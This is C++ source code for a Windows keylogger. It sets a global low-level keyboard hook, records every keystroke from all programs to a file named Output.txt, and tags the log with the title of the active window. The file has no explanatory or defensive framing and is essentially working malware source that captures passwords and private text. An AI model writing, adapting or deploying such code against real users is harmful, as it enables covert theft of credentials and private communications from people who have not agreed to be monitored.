#include <windows.h>
#include <iostream>
#include <fstream>

int save(int key);
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
HHOOK hook;
KBDLLHOOKSTRUCT kbStruct;

std::ofstream file;
char previousProgram[256];

int save(int key)
{

	HWND foreground = GetForegroundWindow();
	DWORD processID;

	if (foreground)
	{
		processID = GetWindowThreadProcessId(foreground, NULL);
		char currentProgram[256];
		GetWindowTextA(foreground, currentProgram, 256);
		if (strncmp(currentProgram, previousProgram, 256) != 0)
		{
			strcpy_s(previousProgram, currentProgram);
			file << "\n\n\Program:  " << currentProgram << "		";
		}
	}

	std::cout << key << '\n';
	bool shift_down = GetAsyncKeyState(VK_SHIFT);
	switch (key)
	{
	case VK_SPACE: file << " "; break;
	case VK_BACK: file << "[BACKSPACE]"; break;
	case VK_RETURN: file << "\n"; break;
	case VK_TAB: file << "[TAB]";     break;
	case VK_SHIFT: file << "[SHIFT]"; break;
	case VK_RSHIFT: file << "[SHIFT]"; break;
	case VK_LSHIFT: file << "[SHIFT]"; break;
	case VK_CONTROL: file << "[CTRL]"; break;
	case VK_LCONTROL: file << "[CTRL]"; break;
	case VK_RCONTROL: file << "[CTRL]"; break;
	case VK_ESCAPE: file << "[ESC]";  break;
	case VK_END: file << "[END]";     break;
	case VK_HOME: file << "[HOME]";   break;
	case VK_RIGHT: file << "[RIGHT]"; break;
	case VK_LEFT: file << "[LEFT]";   break;
	case VK_UP: file << "[UP]";       break;
	case VK_DOWN: file << "[DOWN]";   break;
	case VK_CAPITAL: file << "[CAPS LOCK]"; break;
	case 0x30: (!shift_down) ? file << "0" : file << ")";   break;
	case 0x31: (!shift_down) ? file << "1" : file << "!";   break;
	case 0x32: (!shift_down) ? file << "2" : file << "@";   break;
	case 0x33: (!shift_down) ? file << "3" : file << "#";   break;
	case 0x34: (!shift_down) ? file << "4" : file << "$";   break;
	case 0x35: (!shift_down) ? file << "5" : file << "%";   break;
	case 0x36: (!shift_down) ? file << "6" : file << "^";   break;
	case 0x37: (!shift_down) ? file << "7" : file << "&";   break;
	case 0x38: (!shift_down) ? file << "8" : file << "*";   break;
	case 0x39: (!shift_down) ? file << "9" : file << "(";   break;
	case 0xBA: (!shift_down) ? file << ";" : file << ":";   break;
	case 0xBB: (!shift_down) ? file << "=" : file << "+";   break;
	case 0xBC: (!shift_down) ? file << "," : file << "<";   break;
	case 0xBD: (!shift_down) ? file << "-" : file << "_";   break;
	case 0xBE: (!shift_down) ? file << "." : file << ">";   break;
	case 0xBF: (!shift_down) ? file << "/" : file << "?";   break;
	case 0xC0: (!shift_down) ? file << "`" : file << "~";   break;
	case 0xDB: (!shift_down) ? file << "[" : file << "{";   break;
	case 0xDC: (!shift_down) ? file << "\\" : file << "|";  break;
	case 0xDD: (!shift_down) ? file << "]" : file << "}";   break;
	case 0xDE: (!shift_down) ? file << "'" : file << "\"";  break;
	default:
		char currentKey;
		bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
		if (shift_down) //capslock
		{
			lower = !lower;
		}
		currentKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, NULL);
		if (!lower)
		{
			currentKey = tolower(currentKey);
		}
		file << char(currentKey);
		break;
	}
	file.flush();
	return 0;
}


LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
			save(kbStruct.vkCode);
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main()
{
	file.open("Output.txt");
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBoxA(NULL, "Error :(\n", "Error", MB_ICONERROR);
	}
	MSG message;
	while (true)
	{
		GetMessage(&message, NULL, 0, 0);
	}
}
